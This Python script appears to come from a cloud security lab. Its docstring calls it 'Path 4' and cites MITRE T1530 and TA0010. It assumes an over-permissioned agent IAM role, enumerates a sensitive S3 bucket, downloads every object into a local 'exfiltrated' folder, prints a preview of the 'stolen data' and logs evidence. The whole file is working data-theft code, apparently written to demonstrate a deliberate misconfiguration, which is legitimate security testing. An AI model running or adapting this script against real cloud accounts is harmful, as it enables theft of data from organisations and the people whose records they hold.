"""
Path 4 — data exfiltration from S3.

As agent-exec-role (whose FLAW 2 wildcard grants s3:* on *), enumerate and download
the entire sensitive-data bucket and stage it locally — i.e. exfiltrate it. The same
data is also reachable via Path 1's escalated privileged-role; the agent role's own
over-permission makes it a one-step exfil here.

MITRE ATT&CK: T1530 (Data from Cloud Storage Object), TA0010 (Exfiltration).
"""

from __future__ import annotations

import json
import sys
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "agent"))
from awsctx import resolve_config, assume_agent_session  # noqa: E402

EVIDENCE_DIR = Path(__file__).resolve().parents[1] / "evidence" / "path4"
STAGE_DIR = EVIDENCE_DIR / "exfiltrated"


def main() -> int:
    cfg = resolve_config()
    bucket = cfg["sensitive_bucket"]
    session = assume_agent_session(cfg["role_arn"], session_name="cf-exfil")
    s3 = session.client("s3")
    who = session.client("sts").get_caller_identity()["Arn"]
    print(f"[*] operating as: {who}")
    print(f"[*] target bucket: {bucket}")

    STAGE_DIR.mkdir(parents=True, exist_ok=True)
    ev = {"attack": "path4-data-exfil", "timestamp": datetime.now(timezone.utc).isoformat(),
          "operating_as": who, "bucket": bucket, "objects": []}

    keys = [o["Key"] for o in s3.list_objects_v2(Bucket=bucket).get("Contents", [])]
    print(f"[*] enumerated {len(keys)} object(s): {keys}")

    total = 0
    preview = None
    for key in keys:
        body = s3.get_object(Bucket=bucket, Key=key)["Body"].read()
        total += len(body)
        (STAGE_DIR / Path(key).name).write_bytes(body)
        text = body.decode("utf-8", errors="replace")
        if preview is None:
            preview = "\n".join(text.splitlines()[:4])
        ev["objects"].append({"key": key, "bytes": len(body)})
        print(f"    [+] exfiltrated {key} ({len(body)} bytes)")

    ev["total_bytes"] = total
    ev["preview"] = preview
    ev["exfil_succeeded"] = total > 0
    print(f"[+] exfiltrated {total} bytes to {STAGE_DIR}")
    if preview:
        print("[+] sample of stolen data:")
        print("    " + preview.replace("\n", "\n    "))

    (EVIDENCE_DIR / "evidence.json").write_text(json.dumps(ev, indent=2), encoding="utf-8")
    print(f"[*] evidence written to {EVIDENCE_DIR / 'evidence.json'}")
    return 0 if total > 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
